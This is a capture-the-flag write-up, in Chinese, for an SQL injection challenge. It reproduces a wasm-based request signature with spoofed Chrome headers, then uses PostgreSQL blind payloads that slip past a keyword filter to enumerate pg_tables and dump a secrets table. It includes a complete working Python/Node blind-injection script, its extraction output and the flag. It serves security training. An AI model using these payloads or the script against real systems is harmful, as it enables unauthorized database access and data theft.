# SUCTF2026-sqli

## 题目简述
题目是带前端签名的 SQL 注入。附件中的 `app.js` 和两个 Go wasm 文件定义签名流程：页面先请求 `/api/sign`，加载 wasm 生成签名，再携带 `q/nonce/ts/sign` 访问 `/api/query`；只有复现签名和浏览器环境材料，后端注入点才可用。wasm 二进制本身不适合全文写入，WP 应保留签名材料、环境字段和 SQL 注入绕过过程。

## 解题过程
页面加载后，核心流程是：

1. 请求 /api/sign

2. 获取 nonce / seed / salt / ts

3. 加载两个 Go 编译出来的 wasm

4. 通过 wasm 生成签名 sign

5. 携带 q + nonce + ts + sign 请求 /api/query

也就是说，如果不能复现前端签名逻辑，后端接口就没法正常打。

在 app.js 中可以看到：
- /api/sign 会返回签名材料

对应 __suPrep • crypto1.wasm

对应 __suFinish • crypto2.wasm

前端签名时还会把以下环境信息拼进去：

- navigator.userAgent
- navigator.userAgentData.brands
- Intl.DateTimeFormat().resolvedOptions().timeZone
- navigator.webdriver

最后构造成一个 probe 字符串：

wd=0;tz=...;b=...;intl=1

然后签名流程大致是：

1. __suPrep(...)

2. 对结果做 unscramble

3. 对结果做 mixSecret

4. __suFinish(...)

5. 得到最终 sign

因此本题第一阶段目标非常明确：把前端的签名逻辑本地复现出来。

复现签名：

app.js 里其实已经把签名链暴露得很完整了。前端会：

1. 调 /api/sign 获取 nonce / seed / salt / ts

2. 加载 crypto1.wasm 和 crypto2.wasm

3. 调用 __suPrep(...)

4. 对结果做 unscramble(...)

5. 再做 mixSecret(...)

6. 最后调用 __suFinish(...)

其中：

- b64UrlToBytes
- bytesToB64Url
- maskBytes
- unscramble
- probeMask
- mixSecret

这些函数都直接写在 app.js 里，属于明文逻辑，照着搬到本地即可。

而真正的核心计算没有必要完全重写，因为题目已经把实现编译进了 wasm。前端加载：

- crypto1.wasm
- crypto2.wasm
- wasm_exec.js

之后，会在全局注册：

- __suPrep
- __suFinish

所以本地签名器做的事情其实是：

1. 在 Node 环境里加载题目的 wasm_exec.js

2. 实例化题目的 crypto1.wasm

3. 实例化题目的 crypto2.wasm

4. 直接调用题目原始实现里的 __suPrep / __suFinish

5. 把 app.js 里可见的 unscramble / mixSecret 流程接起来

也就是说，这个签名器本质上是“把浏览器里的签名过程搬到本地执行”，而不是从零逆向重写一整

套算法。

一开始我以为只要把算法抠出来就行，但直接请求后端时得到的是：

说明问题不只是算法。

继续对比前端代码后发现，签名其实和浏览器指纹绑定。也就是说，服务端不仅验证 q / nonce
/ ts / sign ，还会隐式依赖请求头和浏览器环境。

最终验证下来，要稳定通过签名校验，需要带一组接近 Chrome 的请求头，例如：

```
<br class="Apple-interchange-newline"><div></div>

1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
(KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
2
sec-ch-ua: "Not:A-Brand";v="24", "Chromium";v="134", "Google Chrome";v="134"
3
sec-ch-ua-mobile: ?0
4
sec-ch-ua-platform: "Windows"
```

应的 probe 也要保持一致：

wd=0;tz=Asia/Shanghai;b=Not:A-Brand:24,Chromium:134,Google
Chrome:134;intl=1

这一步打通后，接口就能返回正常结果了。

签名过掉之后，开始测试 q 参数。

当输入单引号 ' 时，后端报错：

ERROR: unterminated quoted string at or near "' LIMIT 20" (SQLSTATE
42601)

这个报错很关键，可以直接得出两点：

1. q 被拼进了 SQL 语句的字符串上下文

2. 数据库是 PostgreSQL

因此基本可以推测后端查询类似：

SELECT ... FROM posts WHERE title ILIKE '%<q>%' LIMIT 20

于是可以确认，这题真正的漏洞点就在 q 。

继续测 payload，可以发现常见关键字基本都被拦了：
- --
- or
- and
- union
- ;
- information_schema
- pg_attribute

被拦时返回：

{"ok":false,"error":"blocked"}

这意味着常规的联合查询、报错注入、注释截断这几条路基本都走不通，必须找更“表达式化”的注

入方式。

由于 q 落在字符串上下文里，所以最自然的利用方式是字符串拼接：

'||(select ...)||'

为了做布尔盲注，我构造了这样一个通用 payload：

'||(select case when <condition> then 'su' else 'zzzzzz' end)||'

原理是：

- 条件为真时，搜索词里会包含 su

- 页面会返回一条已知记录 Welcome to SU Query

- 条件为假时，搜索 zzzzzz

- 返回空结果

测试：

```sql
'||(select case when 1=1 then 'su' else 'zzzzzz' end)||'
'||(select case when 1=2 then 'su' else 'zzzzzz' end)||'
```

前者有结果，后者无结果，说明这条盲注通道是成立的。

先拿 version() 做测试：

结果为真，说明确实是 PostgreSQL。

进一步盲取 version() 的前几个字符，得到：

```sql
python blind_sqli.py --base http://<target>:10001 str
"substring((select version()),1,12)" --max-len 12
>>
[+] length = 12
[1/12] P
[2/12] Po
[3/12] Pos
[4/12] Post
[5/12] Postg
[6/12] Postgr
[7/12] Postgre
[8/12] PostgreS
[9/12] PostgreSQ
[10/12] PostgreSQL
[11/12] PostgreSQL
[12/12] PostgreSQL 1
PostgreSQL 1
```

PostgreSQL 1

到这里，注入链已经验证稳定，可以放心进入信息枚举阶段。

由于 information_schema 被拦，改用 PostgreSQL 自带的 pg_tables 。

先统计 public schema 下的表数量：

$$
(select count(*) from pg_tables where schemaname='public')
$$

```sql
python blind_sqli.py --base http://<target>:10001 int "(select count(*)
from pg_tables where schemaname='public')" --max 20
>>
2
```

再按表名排序逐个取：

```sql
(select tablename from pg_tables where schemaname='public' order by tablename
limit 1)
(select tablename from pg_tables where schemaname='public' order by tablename
offset 1 limit 1)
```

```
python blind_sqli.py --base http://<target>:10001 str "(select
tablename from pg_tables where schemaname='public' order by tablename limit
1)" --max-len 32
>>
[+] length = 5
[1/5] p
[2/5] po
[3/5] pos
[4/5] post
[5/5] posts
posts

python blind_sqli.py --base http://<target>:10001 str "(select
tablename from pg_tables where schemaname='public' order by tablename offset 1
limit 1)" --max-len 32
>>
[+] length = 7
[1/7] s
[2/7] se
[3/7] sec
[4/7] secr
[5/7] secre
[6/7] secret
[7/7] secrets

secrets
```

最终得到两张表：

- posts
- secrets

posts 明显是前台搜索内容，secrets 一看就是目标表。

按正常思路，下一步应该枚举 secrets 表的列名。但我在尝试 pg_attribute 时发现它会被
WAF 直接拦截。

所以这里换一种更直接的思路：不去枚举列，而是直接把整行转成 JSON 文本，再逐字符盲取。

可用表达式是：

$$
concat((select to_json(x) from (select * from secrets limit 1) x))
$$

然后结合 substring 和 ascii 做字符盲注即可。

例如布尔判断模板可以写成：

$$
'||(select case when ascii(substring((<expr>),<pos>,1))>=<mid> then
$$
'su' else 'zzzzzz' end)||'

这样就可以对整行 JSON 做二分盲注。

为了避免手工逐位猜测，我又写了一个脚本自动跑盲注（签名器在脚本已存在）

```python
import argparse
import atexit
import json
import os
import subprocess
import sys
import tempfile
import urllib.error
import urllib.request
from pathlib import Path

DEFAULT_BASE = "http://<target>:10001"
UA = (
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
"AppleWebKit/537.36 (KHTML, like Gecko) "
"Chrome/134.0.0.0 Safari/537.36"
)
SEC_CH_UA = '"Not:A-Brand";v="24", "Chromium";v="134", "Google Chrome";v="134"'

PROBE = "wd=0;tz=Asia/Shanghai;b=Not:A-Brand:24,Chromium:134,Google
Chrome:134;intl=1"
APP_ROOT = str((Path(__file__).resolve().parent / "application"))
SIGN_SCRIPT = None
EMBEDDED_SIGNER = r"""
const fs = require("fs");
const path = require("path");
const vm = require("vm");
const { webcrypto } = require("crypto");

globalThis.crypto = webcrypto;

const root = process.env.APPLICATION_ROOT;

function b64UrlToBytes(s) {
let t = s.replace(/-/g, "+").replace(/_/g, "/");
while (t.length % 4) t += "=";
return Uint8Array.from(Buffer.from(t, "base64"));
}

function bytesToB64Url(bytes) {
return Buffer.from(bytes)
.toString("base64")
.replace(/\+/g, "-")
.replace(/\//g, "_")
.replace(/=+$/g, "");
}

function rotl32(x, r) {
return ((x << r) | (x >>> (32 - r))) >>> 0;
}

function rotr32(x, r) {
return ((x >>> r) | (x << (32 - r))) >>> 0;
}

function maskBytes(nonceB64, ts) {
const nb = b64UrlToBytes(nonceB64);
let s = 0 >>> 0;
for (let i = 0; i < nb.length; i++) {
s = (Math.imul(s, 131) + nb[i]) >>> 0;
}
const hi = Math.floor(ts / 0x100000000);
s = (s ^ (ts >>> 0) ^ (hi >>> 0)) >>> 0;
const out = new Uint8Array(32);
for (let i = 0; i < 32; i++) {
s ^= (s << 13) >>> 0;

s ^= s >>> 17;
s ^= (s << 5) >>> 0;
out[i] = s & 0xff;
}
return out;
}

function unscramble(pre, nonceB64, ts) {
const rotScr = [1, 5, 9, 13, 17, 3, 11, 19];
const buf = b64UrlToBytes(pre);
for (let i = 0; i < 8; i++) {
const o = i * 4;
let w =
(buf[o] | (buf[o + 1] << 8) | (buf[o + 2] << 16) | (buf[o + 3] << 24))
>>> 0;
w = rotr32(w, rotScr[i]);
buf[o] = w & 0xff;
buf[o + 1] = (w >>> 8) & 0xff;
buf[o + 2] = (w >>> 16) & 0xff;
buf[o + 3] = (w >>> 24) & 0xff;
}
const mask = maskBytes(nonceB64, ts);
for (let i = 0; i < 32; i++) buf[i] ^= mask[i];
return buf;
}

function probeMask(probe, ts) {
let s = 0 >>> 0;
for (let i = 0; i < probe.length; i++) {
s = (Math.imul(s, 33) + probe.charCodeAt(i)) >>> 0;
}
const hi = Math.floor(ts / 0x100000000);
s = (s ^ (ts >>> 0) ^ (hi >>> 0)) >>> 0;
const out = new Uint8Array(32);
for (let i = 0; i < 32; i++) {
s = (Math.imul(s, 1103515245) + 12345) >>> 0;
out[i] = (s >>> 16) & 0xff;
}
return out;
}

function mixSecret(buf, probe, ts) {
const mask = probeMask(probe, ts);
if (mask[0] & 1) {
for (let i = 0; i < 32; i += 2) {
const t = buf[i];
buf[i] = buf[i + 1];

buf[i + 1] = t;
}
}
if (mask[1] & 2) {
for (let i = 0; i < 8; i++) {
const o = i * 4;
let w =
(buf[o] | (buf[o + 1] << 8) | (buf[o + 2] << 16) | (buf[o + 3] << 24))
>>> 0;
w = rotl32(w, 3);
buf[o] = w & 0xff;
buf[o + 1] = (w >>> 8) & 0xff;
buf[o + 2] = (w >>> 16) & 0xff;
buf[o + 3] = (w >>> 24) & 0xff;
}
}
for (let i = 0; i < 32; i++) buf[i] ^= mask[i];
return buf;
}

function loadGoRuntime() {
const wasmExec = fs.readFileSync(path.join(root, "wasm_exec.js"), "utf8");
vm.runInThisContext(wasmExec, { filename: "wasm_exec.js" });
}

async function loadWasm(file) {
const go = new Go();
const wasm = await WebAssembly.instantiate(fs.readFileSync(path.join(root,
file)), go.importObject);
go.run(wasm.instance);
}

async function init() {
loadGoRuntime();
await loadWasm("crypto1.wasm");
await loadWasm("crypto2.wasm");
if (typeof globalThis.__suPrep !== "function" || typeof
globalThis.__suFinish !== "function") {
throw new Error("wasm init failed");
}
}

function buildSig(material, q, ua, probe) {
const pre = globalThis.__suPrep(
"POST",
"/api/query",
q,

material.nonce,
String(material.ts),
material.seed,
material.salt,
ua,
probe
);
if (!pre) {
throw new Error("prep failed");
}
const secret2 = unscramble(pre, material.nonce, material.ts);
const mixed = mixSecret(secret2, probe, material.ts);
return globalThis.__suFinish(
"POST",
"/api/query",
q,
material.nonce,
String(material.ts),
bytesToB64Url(mixed),
probe
);
}

async function main() {
const [qArg, uaArg, probeArg] = process.argv.slice(2);
const q = process.env.QUERY_VALUE || qArg;
const ua = uaArg || "";
const probe = probeArg || "";

await init();
const materialJson = process.env.MATERIAL_JSON ?
JSON.parse(process.env.MATERIAL_JSON) : null;
if (!materialJson || !q) {
throw new Error("missing MATERIAL_JSON or QUERY_VALUE");
}
const material = materialJson.data || materialJson;
const sign = buildSig(material, q, ua, probe);
console.log(
JSON.stringify(
{
q,
ua,
probe,
nonce: material.nonce,
ts: material.ts,
sign,
},

null,
2
)
);
}

main().catch((err) => {
console.error(err);
process.exit(1);
});
"""

HEADERS = {
"User-Agent": UA,
"sec-ch-ua": SEC_CH_UA,
"sec-ch-ua-mobile": "?0",
"sec-ch-ua-platform": '"Windows"',
}

def _cleanup_signer(path):
try:
if path and os.path.exists(path):
os.unlink(path)
except OSError:
pass

def get_sign_script():
global SIGN_SCRIPT
if SIGN_SCRIPT:
return SIGN_SCRIPT
fd, path = tempfile.mkstemp(prefix="su_sqli_sign_", suffix=".js")
with os.fdopen(fd, "w", encoding="utf-8", newline="\n") as fh:
fh.write(EMBEDDED_SIGNER)
atexit.register(_cleanup_signer, path)
SIGN_SCRIPT = path
return SIGN_SCRIPT

def http_json(url, method="GET", headers=None, body=None, timeout=20):
data = None
req_headers = dict(headers or {})
if body is not None:
data = json.dumps(body).encode()
req_headers["Content-Type"] = "application/json"

req = urllib.request.Request(url, data=data, headers=req_headers,
method=method)
try:

with urllib.request.urlopen(req, timeout=timeout) as resp:
return json.loads(resp.read().decode())
except urllib.error.HTTPError as exc:
text = exc.read().decode()
try:
return json.loads(text)
except json.JSONDecodeError:
raise RuntimeError(text) from exc

def get_material(base):
return http_json(f"{base}/api/sign", headers=HEADERS)

def sign_query(material, query):
env = os.environ.copy()
env["MATERIAL_JSON"] = json.dumps(material, separators=(",", ":"))
env["QUERY_VALUE"] = query
env["APPLICATION_ROOT"] = APP_ROOT
proc = subprocess.run(
["node", get_sign_script(), "_", UA, PROBE],
capture_output=True,
text=True,
env=env,
check=True,
)
return json.loads(proc.stdout)

def signed_query(base, query):
material = get_material(base)
sig = sign_query(material, query)
body = {
"q": query,
"nonce": sig["nonce"],
"ts": sig["ts"],
"sign": sig["sign"],
}
return http_json(f"{base}/api/query", method="POST", headers=HEADERS,
body=body)

def test_condition(base, condition):
payload = f"'||(select case when {condition} then 'su' else 'zzzzzz'
end)||'"
result = signed_query(base, payload)
if result.get("ok") is not True:
raise RuntimeError(result)
return len(result.get("data", [])) > 0

def get_int_value(base, expr, upper_bound):

for i in range(upper_bound + 1):
if test_condition(base, f"(({expr})={i})"):
return i
raise RuntimeError(f"int not found: {expr}")

def get_string_value(base, expr, max_len):
length = get_int_value(base, f"length(({expr}))", max_len)
print(f"[+] length = {length}")
chars = []
for pos in range(1, length + 1):
lo, hi = 32, 126
while lo < hi:
mid = (lo + hi + 1) // 2
cond = f"(ascii(substring(({expr}),{pos},1))>={mid})"
if test_condition(base, cond):
lo = mid
else:
hi = mid - 1
chars.append(chr(lo))
print(f"[{pos}/{length}] {''.join(chars)}")
return "".join(chars)

def build_parser():
parser = argparse.ArgumentParser(description="Blind SQLi helper for
SU_sqli")
parser.add_argument("--base", default=DEFAULT_BASE, help="target base url")
sub = parser.add_subparsers(dest="mode", required=True)

p_query = sub.add_parser("query", help="send a raw q value and print the
JSON response")
p_query.add_argument("q", help="raw q parameter")

p_bool = sub.add_parser("bool", help="test a boolean SQL condition")
p_bool.add_argument("condition", help="SQL condition, e.g. (1=1)")

p_int = sub.add_parser("int", help="read an integer SQL expression")
p_int.add_argument("expr", help="SQL expression")
p_int.add_argument("--max", type=int, default=128, help="max integer to
try")

p_str = sub.add_parser("str", help="read a string SQL expression")
p_str.add_argument("expr", help="SQL expression")
p_str.add_argument("--max-len", type=int, default=128, help="max string
length")

p_flag = sub.add_parser("flag", help="dump the first row of secrets as
JSON")

p_flag.add_argument(
"--max-len",
type=int,
default=128,
help="max string length",
)

return parser

def main():
args = build_parser().parse_args()

if args.mode == "query":
print(json.dumps(signed_query(args.base, args.q), ensure_ascii=False,
indent=2))
return

if args.mode == "bool":
print(test_condition(args.base, args.condition))
return

if args.mode == "int":
print(get_int_value(args.base, args.expr, args.max))
return

if args.mode == "str":
print(get_string_value(args.base, args.expr, args.max_len))
return

if args.mode == "flag":
expr = "concat((select to_json(x) from (select * from secrets limit 1)
x))"
print(get_string_value(args.base, expr, args.max_len))
return

raise RuntimeError("unknown mode")

if __name__ == "__main__":
try:
main()
except subprocess.CalledProcessError as exc:
sys.stderr.write(exc.stderr or str(exc))
sys.exit(1)
except Exception as exc:
sys.stderr.write(f"{exc}\n")
sys.exit(1)
```

```text
python blind_sqli.py --base http://<target>:10001 str "concat((select
to_json(x) from (select * from secrets limit 1) x))" --max-len 128
>>
[+] length = 54
[1/54] {
[2/54] {"
[3/54] {"i
[4/54] {"id
[5/54] {"id"
[6/54] {"id":
[7/54] {"id":1
[8/54] {"id":1,
[9/54] {"id":1,"
[10/54] {"id":1,"f
[11/54] {"id":1,"fl
[12/54] {"id":1,"fla
[13/54] {"id":1,"flag
[14/54] {"id":1,"flag"
[15/54] {"id":1,"flag":
[16/54] {"id":1,"flag":"
[17/54] {"id":1,"flag":"S
[18/54] {"id":1,"flag":"SU
[19/54] {"id":1,"flag":"SUC
[20/54] {"id":1,"flag":"SUCT
[21/54] {"id":1,"flag":"SUCTF
[22/54] {"id":1,"flag":"SUCTF{
[23/54] {"id":1,"flag":"SUCTF{P
[24/54] {"id":1,"flag":"SUCTF{P9
[25/54] {"id":1,"flag":"SUCTF{P9s
[26/54] {"id":1,"flag":"SUCTF{P9s9
[27/54] {"id":1,"flag":"SUCTF{P9s9L
[28/54] {"id":1,"flag":"SUCTF{P9s9L_
[29/54] {"id":1,"flag":"SUCTF{P9s9L_!
[30/54] {"id":1,"flag":"SUCTF{P9s9L_!N
[31/54] {"id":1,"flag":"SUCTF{P9s9L_!Nj
[32/54] {"id":1,"flag":"SUCTF{P9s9L_!Nje
[33/54] {"id":1,"flag":"SUCTF{P9s9L_!Njec
[34/54] {"id":1,"flag":"SUCTF{P9s9L_!Nject
[35/54] {"id":1,"flag":"SUCTF{P9s9L_!Nject!
[36/54] {"id":1,"flag":"SUCTF{P9s9L_!Nject!O
[37/54] {"id":1,"flag":"SUCTF{P9s9L_!Nject!On
[38/54] {"id":1,"flag":"SUCTF{P9s9L_!Nject!On_
[39/54] {"id":1,"flag":"SUCTF{P9s9L_!Nject!On_I
[40/54] {"id":1,"flag":"SUCTF{P9s9L_!Nject!On_IS

[41/54] {"id":1,"flag":"SUCTF{P9s9L_!Nject!On_IS_
[42/54] {"id":1,"flag":"SUCTF{P9s9L_!Nject!On_IS_3
[43/54] {"id":1,"flag":"SUCTF{P9s9L_!Nject!On_IS_3@
[44/54] {"id":1,"flag":"SUCTF{P9s9L_!Nject!On_IS_3@$
[45/54] {"id":1,"flag":"SUCTF{P9s9L_!Nject!On_IS_3@$Y
[46/54] {"id":1,"flag":"SUCTF{P9s9L_!Nject!On_IS_3@$Y_
[47/54] {"id":1,"flag":"SUCTF{P9s9L_!Nject!On_IS_3@$Y_R
[48/54] {"id":1,"flag":"SUCTF{P9s9L_!Nject!On_IS_3@$Y_Ri
[49/54] {"id":1,"flag":"SUCTF{P9s9L_!Nject!On_IS_3@$Y_RiG
[50/54] {"id":1,"flag":"SUCTF{P9s9L_!Nject!On_IS_3@$Y_RiGh
[51/54] {"id":1,"flag":"SUCTF{P9s9L_!Nject!On_IS_3@$Y_RiGht
[52/54] {"id":1,"flag":"SUCTF{P9s9L_!Nject!On_IS_3@$Y_RiGht}
[53/54] {"id":1,"flag":"SUCTF{P9s9L_!Nject!On_IS_3@$Y_RiGht}"
[54/54] {"id":1,"flag":"SUCTF{P9s9L_!Nject!On_IS_3@$Y_RiGht}"}
{"id":1,"flag":"SUCTF{P9s9L_!Nject!On_IS_3@$Y_RiGht}"}
```

## 方法总结
- 核心技巧：前端 wasm 签名复现 + SQLi
- 识别信号：接口调用必须带 nonce/ts/sign，签名由 wasm 和浏览器环境共同生成。
- 复用要点：先复现前端签名或在浏览器环境中调用，再对后端查询参数做注入。
